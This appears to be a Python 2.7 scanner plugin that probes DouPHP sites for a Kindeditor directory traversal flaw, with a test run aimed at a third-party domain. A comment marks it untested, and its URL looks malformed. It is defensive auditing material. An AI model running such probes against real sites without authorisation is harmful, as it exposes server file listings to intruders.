#!/usr/bin/python2.7
#coding:utf-8

import urllib2
from dummy import *

info = {
	'NAME':'Kindeditor Directory Traversal',
	'AUTHOR':'WJK,1c3z',
	'TIME':'20150320',
	'WEB':'http://www.wooyun.org/bugs/wooyun-2010-076974',
	'DESCRIPTION':'Kindeditor导致的目录遍历'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url']
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms']=='douphp':
		return True
	return False

def Audit(services):
	url = services['url'] + '/?admin/include/kindeditor/php/file_manager_json.php?path=/&dir=image'
	try:
		ul= urllib2.urlopen(url)
		content=ul.read()
		if content.find("total_count") != -1 and content.find("file_list") != -1:
			security_warning('find Directory traversal:' + url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
